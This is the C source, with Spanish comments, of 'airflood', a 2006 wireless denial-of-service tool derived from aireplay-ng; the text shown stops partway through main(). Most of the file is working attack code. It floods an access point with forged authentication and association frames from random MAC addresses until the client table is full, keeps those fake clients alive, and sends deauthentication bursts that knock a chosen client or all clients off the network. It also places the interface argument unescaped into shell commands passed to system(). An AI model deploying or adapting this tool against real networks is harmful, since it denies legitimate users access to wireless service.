/*****************************************************************************
 * Fichero:			airflood.c
 * Fecha:			07-03-2006
 * Autor:			Nilp0inteR (nilp0inter2k6[at]gmail[dot]com)
 * Actualizado:			10-03-2006
 * Notas:			Basado en aireplay-ng de Thomas d'Otreppe 
 * 			          basado a su vez en aireplay original de
 *				  Christophe Devine
 * 
 * Descripcion: Airflood es una herramienta que permite hacer un ataque DoS 
 *    denominado "accesspoint overloaded" o sobrecarga de punto de acceso.
 *    El ataque consiste en llenar la tabla de clientes del punto de acceso 
 *    con conexiones falsas. De este modo, ningun cliente legitimo puede 
 *    conectarse a la red.
 *
 * Atencion: Este programa no se distribuye para realizar acciones ilegales, 
 *    simplemente es una prueba de concepto, cualquier utilización ilegal de
 *    este programa no sera responsabilidad del autor del mismo.
 * 
 * Licencia: Este programa es software libre; puedes redistribuirlo y/o 
 *    modificarlo bajo los terminos de la Licencia Publica General GNU (GPL) 
 *    publicada por la Free Software Foundation; en su version numero 2, o  
 *    (bajo tu criterio) la ultima version. Disponible en:
 *
 *                    http://www.fsf.org/copyleft/gpl.txt.
 * 
 * Este programa se distribuye sin GARANTIA de ningun tipo.
 *
 *****************************************************************************/

#include <linux/rtc.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>

#include "pcap.h"


#define VERSION 0
#define SUBVERSION 1

#define NULL_MAC        "\x00\x00\x00\x00\x00\x00"
#define BROADCAST       "\xFF\xFF\xFF\xFF\xFF\xFF"

#define ARPHRD_IEEE80211        801
#define ARPHRD_IEEE80211_PRISM  802
#define ARPHRD_IEEE80211_FULL   803

#ifndef ETH_P_80211_RAW
#define ETH_P_80211_RAW 25
#endif

#define DEAUTH_REQ      \
    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ        \
    "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ       \
    "\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define NULL_DATA       \
    "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RATES           \
    "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

char usage[] =
"\n  ataques:\n"
"     -F	: LLena el espacio de clientes de la red\n"
"     -L	: Igual que -F pero en repeticion continua\n"
"\n  opciones:\n"
"     -e	: ESSID de la red\n"
"     -a	: BSSID de la red\n"
"     -d	: Retardo entre paquetes keep-alive\n"
"     -h	: Cliente autentico de la red que se quiere expulsar\n"
"     -c	: Cantidad de paquetes de desautentificacion en cada envio\n"
"     -v	: MAC reservada en el espacio de clientes\n"
"     -t	: Si se cumple el tiempo de un cliente se actualizan todos (util en algunos AP)\n"
"\n  uso: airflood <ataque> [opciones] <interfaz>\n"
"\n";

typedef struct client nodo;

struct client
{
        unsigned char mac[6];
        time_t update;
        nodo *next;
};

struct options
{
    unsigned char f_bssid[6];
    unsigned char f_dmac[6];
    unsigned char f_smac[6];
    int f_minlen;
    int f_maxlen;
    int f_type;
    int f_subtype;
    int f_tods;
    int f_fromds;
    int f_iswep;

    int r_nbpps;
    int r_fctrl;
    unsigned char r_bssid[6];
    unsigned char r_dmac[6];
    unsigned char r_smac[6];
    unsigned char validmac[6];

    char r_essid[33];
    int r_fromdsinj;

    char *s_face;
    char *s_file;

    int a_mode;
    int a_count;
    int a_delay;

    int a_timeout;
    int maxnoauth;

    int a_alive;
    int loop;
    int all;    
}
opt;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

    int is_wlanng;
    int is_hostap;
    int is_madwifi;

    FILE *f_cap_in;

    struct pcap_file_header pfh_in;
}
dev;

struct ARP_req
{
    unsigned char *buf;
    int len;
};

unsigned long nb_pkt_sent;
unsigned char h80211[4096];
unsigned char tmpbuf[4096];
unsigned char srcbuf[4096];
char strbuf[512];

int ctrl_c, alarmed;

void sighandler( int signum )
{
    if( signum == SIGINT )
        ctrl_c++;

    if( signum == SIGALRM )
        alarmed++;
}

//
// Borra un numero de digitos de la pantalla
//
void borra_digitos(int num)
{
	int i;
	if(num==0)
	{
		printf("\b");
	}
	else
	{
		for(i=1;num%i!=num;i*=10)
			printf("\b");
	}
}

/* wlanng-aware frame sending routing */

int send_packet( void *buf, size_t count )
{
    int ret;

    if( dev.is_wlanng && count >= 24 )
    {
        /* for some reason, wlan-ng requires a special header */

        if( ( ((unsigned char *) buf)[0] & 3 ) != 3 )
        {
            memcpy( tmpbuf, buf, 24 );
            memset( tmpbuf + 24, 0, 22 );

            tmpbuf[30] = ( count - 24 ) & 0xFF;
            tmpbuf[31] = ( count - 24 ) >> 8;

            memcpy( tmpbuf + 46, buf + 24, count - 24 );

            count += 22;
        }
        else
        {
            memcpy( tmpbuf, buf, 30 );
            memset( tmpbuf + 30, 0, 16 );

            tmpbuf[30] = ( count - 30 ) & 0xFF;
            tmpbuf[31] = ( count - 30 ) >> 8;

            memcpy( tmpbuf + 46, buf + 30, count - 30 );

            count += 16;
        }

        buf = tmpbuf;
    }

    if( ( dev.is_wlanng || dev.is_hostap ) &&
        ( ((uchar *) buf)[1] & 3 ) == 2 )
    {
        unsigned char maddr[6];

        /* Prism2 firmware swaps the dmac and smac in FromDS packets */

        memcpy( maddr, buf + 4, 6 );
        memcpy( buf + 4, buf + 16, 6 );
        memcpy( buf + 16, maddr, 6 );
    }

    ret = write( dev.fd_out, buf, count );

    if( ret < 0 )
    {
        if( errno == EAGAIN || errno == EWOULDBLOCK ||
            errno == ENOBUFS )
        {
            usleep( 10000 );
            return( 0 );
        }

        perror( "write failed" );
        return( -1 );
    }

    nb_pkt_sent++;
    return( 0 );
}

/* madwifi-aware frame reading routing */

int read_packet( void *buf, size_t count )
{
    int caplen, n = 0;

    if( ( caplen = read( dev.fd_in, tmpbuf, count ) ) < 0 )
    {
        if( errno == EAGAIN )
            return( 0 );

        perror( "read failed" );
        return( -1 );
    }

    if( dev.is_madwifi )
        caplen -= 4;    /* remove the FCS */

    memset( buf, 0, sizeof( buf ) );

    if( dev.arptype_in == ARPHRD_IEEE80211_PRISM )
    {
        /* skip the prism header */

        if( tmpbuf[7] == 0x40 )
            n = 64;
        else
            n = *(int *)( tmpbuf + 4 );

        if( n < 8 || n >= caplen )
            return( 0 );
    }

    if( dev.arptype_in == ARPHRD_IEEE80211_FULL )
    {
        /* skip the radiotap header */

        n = *(unsigned short *)( tmpbuf + 2 );

        if( n <= 0 || n >= caplen )
            return( 0 );
    }

    caplen -= n;

    memcpy( buf, tmpbuf + n, caplen );

    return( caplen );
}

//
// Envia paquetes de desautenticacion
//
int do_attack_deauth( void )
{
    int i, n;

    if( memcmp( opt.r_bssid, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a BSSID (-a).\n" );
        return( 1 );
    }
	printf(" [+] Desautentificando: ");
/*    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
        printf( "NB: this attack is more effective when targeting\n"
                "a connected wireless client (-c <client's mac>).\n" ); */
n=0;
    while( 1 )
    {

        if( opt.a_count > 0 && ++n > opt.a_count )
            break;

	if(opt.a_count==0)
		break;;

	if(n>1)
		borra_digitos(n-1);
	printf("%i", n);		
	fflush(stdout);

	
//        usleep( 18000 );

        if( memcmp( opt.r_dmac, NULL_MAC, 6 ) != 0 )
        {
            /* deauthenticate the target */

            memcpy( h80211, DEAUTH_REQ, 26 );
            memcpy( h80211 + 16, opt.r_bssid, 6 );

            for( i = 0; i < 64; i++ )
            {
                memcpy( h80211 +  4, opt.r_dmac,  6 );
                memcpy( h80211 + 10, opt.r_bssid, 6 );

                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

//                usleep( 2000 );

                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_dmac,  6 );

                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

//                usleep( 2000 );
            }
        }
        else
        {
            /* deauthenticate all stations */

            memcpy( h80211, DEAUTH_REQ, 26 );

            memcpy( h80211 +  4, BROADCAST,   6 );
            memcpy( h80211 + 10, opt.r_bssid, 6 );
            memcpy( h80211 + 16, opt.r_bssid, 6 );

            for( i = 0; i < 128; i++ )
            {
                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

//                usleep( 2000 );
            }
        }
    }

    return( 0 );
}

//
// Envia paquetes keep-alive a los miembros de la lista que deben ser 
// actualizados. Si all esta a 1 se actualizaran todos las macs
//
int mantiene_vivos(nodo *aux, int all)
{
	int first=0;
	int num=1;
	unsigned char bssid[6];
        int retorno=0;
	int mayor=0;
	nodo *original;

	opt.a_alive=1;

	original=aux;

	if(opt.a_delay==0)
		return 0;

        while(aux!=NULL)
	{
		if(all==0)
		{
			if(time(0)-aux->update>opt.a_delay)
			{
				if(first==0)
				{
					printf(" [+] Enviando keep-alive: ");
					first++;
					retorno=1;
				}
				else
				{
					borra_digitos(num);
					num++;
				}
				printf("%i", num);
				memcpy(bssid, opt.r_smac, 6); // Guardamos el bssid
	
				memcpy(opt.r_smac, aux->mac, 6); // Ponemos el bssid del cliente
				
				do_attack_fake_auth(original);
				
				memcpy(opt.r_smac, bssid, 6); //Restauramos el bssid
				aux->update=time(0);
			}
		}
		else
		{
			if(time(0)-aux->update>opt.a_delay)
			{
				if(mayor < aux->update)
					mayor=aux->update;
			}
			if(mayor!=0)
			{
				aux=original;
			        while(aux!=NULL)
				{
					aux->update=mayor;
					aux=aux->next;
				}
				mantiene_vivos(original,0);
				break;
			}
		}

		aux=aux->next;
	}
	if(first!=0)
		printf("\n");

	return retorno;
}

//
// Devuelve 1 si existe algun miembro en la lista que necesite una 
// actualizacion.
//
int need_update(nodo *aux)
{
	nodo *original;

	//MANTIENE VIVOS
	opt.a_alive=1;

	original=aux;

	if(opt.a_delay==0)
		return 0;

        while(aux!=NULL)
	{
		if(time(0)-aux->update>opt.a_delay)
		{
			return 1;
		}
		aux=aux->next;
	}

	return 0;
}

//
// Envia asociaciones y autentificaciones falsas
//
int do_attack_fake_auth( nodo *aux )
{
    time_t tt, tr;
    struct timeval tv;

    time_t Tt, Tr;

    fd_set rfds;
    int i, n, state, caplen;
    int mi_b, mi_s, mi_d;
    int x_send;

    unsigned char ackbuf[14];
/*
    if( opt.r_essid[0] == '\0' )
    {
        printf( "Please specify an ESSID (-e).\n" );
        return( 1 );
    }
*/
    if( memcmp( opt.r_bssid, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a BSSID (-a).\n" );
        return( 1 );
    }

    if( memcmp( opt.r_smac,  NULL_MAC, 6 ) == 0 )
    {
        return( 1 );
    }


    memcpy( ackbuf, "\xD4\x00\x00\x00", 4 );
    memcpy( ackbuf +  4, opt.r_bssid, 6 );
    memset( ackbuf + 10, 0, 4 );

    if ( opt.a_alive==1)
    {
	state=4;
    }
    else
    {
	state = 0;
    }

    x_send = 4;
    Tt = Tr = tr = tt = time( NULL );
    
    while( 1 )
    {
	fflush(stdout);
        switch( state )
        {
            case 0:

                state = 1;
                tt = time( NULL );

                /* attempt to authenticate */

                memcpy( h80211, AUTH_REQ, 30 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );

                for( i = 0; i < x_send; i++ )
                {
		    if(need_update(aux))
		    {
			printf(">>\n");
			mantiene_vivos(aux, opt.all);
			printf("      %02X:%02X:%02X:%02X:%02X:%02X  ",
		                opt.r_smac[0], opt.r_smac[1],
		                opt.r_smac[2], opt.r_smac[3],
		                opt.r_smac[4], opt.r_smac[5]);
		    } 
                    if( send_packet( h80211, 30 ) < 0 )
                        return( 1 );

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 1:

                /* waiting for an authentication response */

                if( time( NULL ) - tt >= 2 )
                {
		    if(need_update(aux))
		    {
			printf(">>\n");
			mantiene_vivos(aux, opt.all);
			printf("      %02X:%02X:%02X:%02X:%02X:%02X  ",
		                opt.r_smac[0], opt.r_smac[1],
		                opt.r_smac[2], opt.r_smac[3],
		                opt.r_smac[4], opt.r_smac[5]);
		    }

                    if( x_send < 256 )
		    {
                        x_send *= 2;
		    }
                    else
                    {
			printf("x\n");
                        return( 1 );
                    }

                    state = 0;
                }
		
                break;

            case 2:

                state = 3;
                x_send *= 2;
                tt = time( NULL );

                /* attempt to associate */

                memcpy( h80211, ASSOC_REQ, 30 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );

                n = strlen( opt.r_essid );
                if( n > 32 ) n = 32;

                h80211[28] = 0x00;
                h80211[29] = n;

                memcpy( h80211 + 30, opt.r_essid,  n );
                memcpy( h80211 + 30 + n, RATES, 16 );

                for( i = 0; i < x_send; i++ )
                {
		    if(need_update(aux))
		    { 
			printf(">>\n");
			mantiene_vivos(aux, opt.all);
			printf("      %02X:%02X:%02X:%02X:%02X:%02X  ",
		                opt.r_smac[0], opt.r_smac[1],
		                opt.r_smac[2], opt.r_smac[3],
		                opt.r_smac[4], opt.r_smac[5]);
		    }

                    if( send_packet( h80211, 46 + n ) < 0 )
                        return( 1 );

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 3:

                /* waiting for an association response */

                if( time( NULL ) - tt >= 5 )
                {
                    if( x_send < 256 )
                        x_send *= 4;

                    state = 0;
                }

                break;

            case 4:

                if( opt.a_alive != 1)
                    return( 0 );
/*
                if( time( NULL ) - tt >= opt.a_delay )
                {
                    x_send = 4;
                    state = 0;
                    break;
                }

                if( time( NULL ) - tr >= 15 )
                {
                    tr = time( NULL );
*/
//                      printf( "!" );

                    memcpy( h80211, NULL_DATA, 24 );
                    memcpy( h80211 +  4, opt.r_bssid, 6 );
                    memcpy( h80211 + 10, opt.r_smac,  6 );
                    memcpy( h80211 + 16, opt.r_bssid, 6 );

                    for( i = 0; i < 32; i++ )
                        if( send_packet( h80211, 24 ) < 0 )
                            return( 1 );
		    return 0;
/*
	        }
*/
                break;

            default: break;
        }

        /* read one frame */

        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        tv.tv_sec  = 1;
        tv.tv_usec = 0;

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
        {
            if( errno == EINTR ) continue;
            perror( "select failed" );
            return( 1 );
        }

        if( ! FD_ISSET( dev.fd_in, &rfds ) )
            continue;

        caplen = read_packet( h80211, sizeof( h80211 ) );

        if( caplen  < 0 ) return( 1 );
        if( caplen == 0 ) continue;

        if( caplen < 24 )
            continue;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
            default: mi_b =  4; mi_d = 16; mi_s = 24; break;
        }

        /* check if the dest. MAC is ours and source == AP */

        if( memcmp( h80211 + mi_d, opt.r_smac,  6 ) == 0 &&
            memcmp( h80211 + mi_b, opt.r_bssid, 6 ) == 0 &&
            memcmp( h80211 + mi_s, opt.r_bssid, 6 ) == 0 )
        {
            /* check if we got an deauthentication packet */

            if( h80211[0] == 0xC0 && state == 4 )
            {
                  printf( "Got a deauthentication packet!\n" );
                x_send = 4; state = 0;
                sleep( 3 );
                continue;
            }

            /* check if we got an disassociation packet */

            if( h80211[0] == 0xA0 && state == 4 )
            {
                  printf( "Got a disassociation packet!\n" );
                x_send = 4; state = 0;
                sleep( 3 );
                continue;
            }

            /* check if we got an authentication response */

            if( h80211[0] == 0xB0 && state == 1 )
            {
                state = 0;  

                if( caplen < 30 )
                {
                    printf( "Error: packet length < 30 bytes\n" );
                    sleep( 3 );
                    continue;
                }

                if( h80211[24] != 0 || h80211[25] != 0 )
                {
                    printf( "FATAL: algorithm != Open System (0)\n" );
                    sleep( 3 );
                    continue;
                }

                n = h80211[28] + ( h80211[29] << 8 );

                if( n != 0 )
                {
                    switch( n )
                    {
                    case  1:
                        printf( "AP rejects the source MAC address ?\n" );
                        break;

                    case 10:
                        printf( "AP rejects our capabilities\n" );
                        break;

                    case 13:
                    case 15:
                        printf( "AP rejects open-system authentication\n" );
                        break;

                    default:
                        break;
                    }

                      printf( "Authentication failed (code %d)\n", n );
                    x_send = 4;
                    sleep( 3 );
                    continue;
                }

                state = 2;      /* auth. done */
            }

            /* check if we got an association response */

            if( h80211[0] == 0x10 && state == 3 )
            {
                state = 0;  

                if( caplen < 30 )
                {
                    printf( "Error: packet length < 30 bytes\n" );
                    sleep( 3 );
                    continue;
                }

                n = h80211[26] + ( h80211[27] << 8 );

                if( n != 0 )
                {
                    switch( n )
                    {
                    case  1:
                        printf( "Denied (code  1), is WPA in use ?\n" );
                        break;

                    case 10:
                        printf( "Denied (code 10), open (no WEP) ?\n" );
                        break;

                    case 12:
                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
                        break;

                    default:
                        printf( "Association denied (code %d)\n", n );
                        break;
                    }

                    sleep( 3 );
                    continue;
                }

                printf( "ok\n" );

                tt = time( NULL );
                tr = time( NULL );

                state = 4;      /* assoc. done */
            }
        }
    }

    return( 0 );
}


/* interface initialization routine */

int openraw( char *iface, int fd, int *arptype )
{
    struct ifreq ifr;
    struct packet_mreq mr;
    struct sockaddr_ll sll;

    /* find the interface index */

    memset( &ifr, 0, sizeof( ifr ) );
    strncpy( ifr.ifr_name, iface, sizeof( ifr.ifr_name ) - 1 );

    if( ioctl( fd, SIOCGIFINDEX, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFINDEX) failed" );
        return( 1 );
    }

    /* bind the raw socket to the interface */

    memset( &sll, 0, sizeof( sll ) );
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;

    if( dev.is_wlanng )
        sll.sll_protocol = htons( ETH_P_80211_RAW );
    else
        sll.sll_protocol = htons( ETH_P_ALL );

    if( bind( fd, (struct sockaddr *) &sll,
              sizeof( sll ) ) < 0 )
    {
        perror( "bind(ETH_P_ALL) failed" );
        return( 1 );
    }

    /* lookup the hardware type */

    if( ioctl( fd, SIOCGIFHWADDR, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFHWADDR) failed" );
        return( 1 );
    }

    if( ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211 &&
        ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_PRISM &&
        ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_FULL )
    {
        if( ifr.ifr_hwaddr.sa_family == 1 )
            fprintf( stderr, "\nARP linktype is set to 1 (Ethernet) " );
        else
            fprintf( stderr, "\nUnsupported hardware link type %4d ",
                     ifr.ifr_hwaddr.sa_family );

        fprintf( stderr, "- expected ARPHRD_IEEE80211\nor ARPHRD_IEEE8021"
                         "1_PRISM instead.  Make sure RFMON is enabled:\n"
                         "run 'ifconfig %s up; iwconfig %s mode Monitor "
                         "channel <#>'\n\n", iface, iface );
        return( 1 );
    }

    *arptype = ifr.ifr_hwaddr.sa_family;

    /* enable promiscuous mode */

    memset( &mr, 0, sizeof( mr ) );
    mr.mr_ifindex = sll.sll_ifindex;
    mr.mr_type    = PACKET_MR_PROMISC;

    if( setsockopt( fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP,
                    &mr, sizeof( mr ) ) < 0 )
    {
        perror( "setsockopt(PACKET_MR_PROMISC) failed" );
        return( 1 );
    }

    return( 0 );
}

//
// Crea un nuevo nodo en la lista enlazada
//
nodo *nuevo_nodo()
{
        return ((nodo*)malloc(sizeof(nodo)));
}

//
// Inserta el nodo "nuevo" en la lista
//
nodo *insertar_nodo(nodo *primero, nodo *nuevo)
{
        nuevo->next=primero;
        return nuevo;
}

void imprime_lista(nodo *primero)
{
	int contador=0;
        while(primero!=NULL)
        {
                printf("%02X:%02X:%02X:%02X:%02X:%02X",
                primero->mac[0], primero->mac[1],
                primero->mac[2], primero->mac[3],
                primero->mac[4], primero->mac[5]);
                primero=primero->next;
		contador++;
        }
	printf("%i entradas en la lista.\n", contador);
}

//
// Devuelve el numero de nodos de la lista
//
int cuenta_nodos(nodo *primero)
{
	int contador=0;
	
	while(primero!=NULL)
	{
		contador++;
		primero=primero->next;
	}

	return contador;
}

//
// Genera una direccion MAC aleatoria
//
void rnd_mac(char *mac)
{
        int i;

        for(i=0;i<6;i++)
                mac[i]=random()%256;
}

//
// Llena el espacio de direcciones del AP con direcciones MAC aleatorias
// guardandolas en una lista enlazada
//
int flood()
{
	int noauth=0;
	nodo *lista_mac, *aux;
        unsigned char mac[6];
	int first=0;
	
	lista_mac=NULL;
	do
	{
		do
		{
			opt.a_alive=0;

	                rnd_mac(&mac);
			
			if(first==0 && memcmp( opt.validmac, NULL_MAC, 6 ))
			{
				memcpy(mac, opt.validmac, 6);
				first++;
			}

			memcpy(opt.r_smac, mac, 6);
			printf("      %02X:%02X:%02X:%02X:%02X:%02X  ",
		                mac[0], mac[1],
		                mac[2], mac[3],
		                mac[4], mac[5]);
				
			if(do_attack_fake_auth(lista_mac)==0)
			{
		                if(lista_mac==NULL)
		                {
		                        lista_mac=nuevo_nodo();
			                rnd_mac(&mac);

			                strncpy(lista_mac->mac, opt.r_smac, sizeof(lista_mac->mac));
		                        lista_mac->next=NULL;
		                }
		                else
		                {
			                rnd_mac(&mac);

		                        aux=nuevo_nodo();
		                        strncpy(aux->mac, opt.r_smac, sizeof(aux->mac));
		                        lista_mac=insertar_nodo(lista_mac,aux);
		                }
		                lista_mac->update=time(0);
			
				noauth=0;
			}
			else
			{
				noauth++;
			}
			mantiene_vivos(lista_mac, opt.all);
		}while(noauth<opt.maxnoauth);

		if(cuenta_nodos(lista_mac)>4)
			printf(" [+] Se ha superado el numero de reintentos con %i clientes\n     puede que este lleno ;)\n", cuenta_nodos(lista_mac));
		else
		{
			printf(" [-] Estas muy lejos del punto de acceso o esta lleno :S\n");
		}
		if(opt.a_count!=0)
		{
			do_attack_deauth();
			printf("\n");
		}

		mantiene_vivos(lista_mac, opt.all);
	}
	while(opt.loop);		
	
	if(cuenta_nodos(lista_mac)>4)
		printf("Posiblemente el espacio este lleno! Se han ocupado %i direcciones.\n", cuenta_nodos(lista_mac));

	return 0;
}

/* MAC address parsing routine */

int getmac( char *s, unsigned char *mac )
{
    int i = 0, n;

    while( sscanf( s, "%x", &n ) == 1 )
    {
        if( n < 0 || n > 255 )
            return( 1 );

        mac[i] = n;

        if( ++i == 6 ) break;

        if( ! ( s = strchr( s, ':' ) ) )
            break;

        s++;
    }

    return( i != 6 );
}

char athXraw[] = "athXraw";

char * getVersion(char * progname, int maj, int min, int submin)
{
	char * temp;
	temp = (char *) calloc(1,strlen(progname)+50);

	if (submin>0) {
		sprintf(temp, "%s %d.%d.%d", progname, maj, min, submin);	
	} else {
		sprintf(temp, "%s %d.%d", progname, maj, min);
	}
	temp = realloc(temp, strlen(temp)+1);
	return temp;
}

int main( int argc, char *argv[] )
{
    int n;
    if( geteuid() != 0 )
    {
        printf( "This program requires root privileges.\n" );
        return( 1 );
    }


    /* check the arguments */

    memset( &opt, 0, sizeof( opt ) );

    opt.f_type    = -1; opt.f_subtype   = -1;
    opt.f_minlen  = -1; opt.f_maxlen    = -1;
    opt.f_tods    = -1; opt.f_fromds    = -1;
    opt.f_iswep   = -1;

    opt.a_mode    = -1; opt.r_fctrl     = -1;

    srandom(time(0));
	
    if(argc<7)
    {
        fprintf(stderr, "airflood %i.%i - (C) 2006 nilp0inter2k6_at_gmail.com\n", VERSION, SUBVERSION);
	fprintf(stderr, "%s", usage);
	exit(1);
    }

    while( 1 )
    {
        int option = getopt( argc, argv,
                        "e:a:d:c:h:v:r:tFL" );

        if( option < 0 ) break;
	opt.maxnoauth=3;

        switch( option )
        {
	    case 'e': // Essid
	    	memset(opt.r_essid, 0, sizeof(opt.r_essid));
		strncpy(opt.r_essid, optarg, sizeof(opt.r_essid)-1);
		break;
	    case 'a': // Bssid
		if(getmac(optarg,  opt.r_bssid)!=0)
		{
			printf("La MAC del AP no es valida!\n");
			return 1;
		}
		break;	
	    case 'd': // Keep-alive delay
	        sscanf(optarg, "%d", &opt.a_delay);
//		opt.a_alive=1;
		if(opt.a_delay<0)
		{
			printf("El retardo del keep-alive tiene que ser mayor que 0\n");
			return 1;
		}
		break;
	    case 'c': // Deauth count
		sscanf(optarg, "%d", &opt.a_count);
		if(opt.a_count<0)
		{
			printf("El numero de paquetes de desautentificacion no puede ser menor que cero\n");
			return 1;
		}
		break;
	    case 'r': // Retry counts
		sscanf(optarg, "%d", &opt.maxnoauth);
		if(opt.maxnoauth<0)
		{
			printf("El numero de reintentos debe ser igual o mayor que cero\n");
			return 1;
		}
		break;
	    case 'h': // Clients mac
		if(getmac(optarg, opt.r_dmac) !=0 )
		{
			printf("MAC del cliente erronea!\n");
			return 1;
		}
		break;
	    case 'v': // Mac reserved in the clients space
		if(getmac(optarg, opt.validmac) != 0 )
		{
			printf("MAC reservada erronea!\n");
			return 1;
		}
		break;
	    case 't':
		opt.all=1;
		break;
	    case 'F': // Flood attack
		opt.a_mode=1;
		opt.loop=0;
//		opt.a_delay=0;
	    	break;
	    case 'L':  // LOop flood
		opt.a_mode=2;
		opt.loop=1;
//		opt.a_delay
		break;
            default : 
		printf("Error de parametros\n");
		break;
        }
    }
	
    
    if( opt.a_mode == -1 )
    {
        printf( "Especifica un tipo de ataque.\n" );
        return( 1 );
    }

    if( opt.f_minlen > opt.f_maxlen )
    {
        printf( "Invalid length filter (%d > %d).\n",
                opt.f_minlen, opt.f_maxlen );
        return( 1 );
    }

    memset( &dev, 0, sizeof( dev ) );

    dev.fd_rtc = -1;

    /* open the RTC device if necessary */

#ifdef __i386__
    if( opt.a_mode > 1 )
    {
        if( ( dev.fd_rtc = open( "/dev/rtc", O_RDONLY ) ) < 0 )
        {
            perror( "open(/dev/rtc) failed" );
        }
        else
        {
            if( ioctl( dev.fd_rtc, RTC_IRQP_SET, 1024 ) < 0 )
            {
                perror( "ioctl(RTC_IRQP_SET) failed" );
                printf("Make sure enhanced rtc device support is enabled in the kernel (module\n"
			"rtc, not genrtc) - also try 'echo 1024 >/proc/sys/dev/rtc/max-user-freq'.\n" );
                close( dev.fd_rtc );
                dev.fd_rtc = -1;
            }
            else
            {
                if( ioctl( dev.fd_rtc, RTC_PIE_ON, 0 ) < 0 )
                {
                    perror( "ioctl(RTC_PIE_ON) failed" );
                    close( dev.fd_rtc );
                    dev.fd_rtc = -1;
                }
            }
        }
    }
#endif

    /* create the RAW sockets */

    if( ( dev.fd_in = socket( PF_PACKET, SOCK_RAW,
                              htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET) failed" );
        if( getuid() != 0 )
            fprintf( stderr, "This program requires root privileges.\n" );
        return( 1 );
    }

    if( ( dev.fd_out = socket( PF_PACKET, SOCK_RAW,
                               htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET) failed" );
        return( 1 );
    }

    /* check if wlan-ng or hostap or r8180 */

    if( strlen( argv[optind] ) == 5 &&
        memcmp( argv[optind], "wlan", 4 ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "wlancfg show %s 2>/dev/null | "
                  "grep p2CnfWEPFlags >/dev/null",
                  argv[optind] );

        if( system( strbuf ) == 0 )
            dev.is_wlanng = 1;

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "iwpriv %s 2>/dev/null | "
                  "grep antsel_rx >/dev/null",
                  argv[optind] );

        if( system( strbuf ) == 0 )
            dev.is_hostap = 1;
    }

    /* enable injection on ralink */

    if( strcmp( argv[optind], "ra0" ) == 0 ||
        strcmp( argv[optind], "ra1" ) == 0 ||
        strcmp( argv[optind], "rausb0" ) == 0 ||
        strcmp( argv[optind], "rausb1" ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "iwpriv %s rfmontx 1 &>/dev/null",
                  argv[optind] );
        system( strbuf );
    }

    /* check if newer athXraw interface available */

    if( strlen( argv[optind] ) == 4 &&
        memcmp( argv[optind], "ath", 3 ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "sysctl -w dev.%s.rawdev=1 &>/dev/null",
                  argv[optind] );

        if( system( strbuf ) == 0 )
        {
            athXraw[3] = argv[optind][3];

            memset( strbuf, 0, sizeof( strbuf ) );
            snprintf( strbuf,  sizeof( strbuf ) - 1,
                      "ifconfig %s up", athXraw );
            system( strbuf );

#if 0 /* some people reported problems when prismheader is enabled */
